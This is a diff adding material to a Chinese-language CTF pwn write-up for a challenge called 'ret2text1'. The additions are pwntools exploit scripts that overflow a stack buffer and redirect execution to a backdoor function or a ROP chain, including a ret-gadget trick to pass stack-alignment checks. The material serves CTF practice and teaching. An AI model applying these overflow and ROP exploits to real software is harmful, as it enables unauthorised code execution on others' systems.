@@ -31,7 +31,28 @@ io.interactive()
 
 ### ret2text1
 
-:star2:exp:
+若本地环境大于Ubuntu18，则需要使用clibc去将程序的glibc版本修改到旧版本，否则无法成功利用漏洞。
+
+```bash
+#将glibc版本改为旧版本
+clibc pwn 2.23
+```
+
+简单版本exp：
+
+```python
+from pwn import *
+context(os='linux',arch='amd64',log_level='debug')
+elf = ELF("./pwn") #使用ELF函数去解析目标文件，存储为elf对象
+io = process("./pwn_new") #启动一个进程，命名为io
+io.recvuntil(b"do you know ret2text?\n") #一直接收数据，直到接收到指定数据
+back_door = 0x401235 #ida查找后门地址
+payload = b's'*0x58 + p64(back_door) #填充正常空间+rbp + 恶意地址
+io.sendline(payload) #发送payloa
+io.interactive() #进行交互
+```
+
+:star2:高级手动构造rop的exp:
 
 ```python
 from pwn import *
@@ -49,6 +70,33 @@ payload = b's' * 0x58 +p64(pop_rdi) + p64(shell_adr) +p64(sys_adr)
 io.sendlineafter(b"do you know ret2text?",payload)
 io.interactive()
 ```
+
+新版添加了栈对齐校验也有办法绕过，添加一个ret指令即可：
+
+使用ROPgadget查询ret指令：
+
+```bash
+ROPgadget --binary ./pwn --only"pop|ret"
+```
+
+![image-20240522173002990](http://image.shangu127.top/img/2024/03/image-20240522173002990.png)
+
+此脚本可以在高版本linux中成功利用漏洞：
+
+```python
+from pwn import *
+context(os='linux',arch='amd64',log_level='debug')
+elf = ELF("./pwn") #使用ELF函数去解析目标文件，存储为elf对象
+io = process("./pwn") #启动一个进程，命名为io
+io.recvuntil(b"do you know ret2text?\n") #一直接收数据，直到接收到指定数据
+back_door = 0x401235 #ida查找后门地址
+ret = 0x40101a #ROPgadget --binary ./pwn --only"pop|ret"
+payload = b's'*0x58 + p64(ret) + p64(back_door) #填充正常空间+rbp + 恶意地址
+io.sendline(payload) #发生payloa
+io.interactive() #进行交互
+```
+
+
 
 ### ret2text2
 
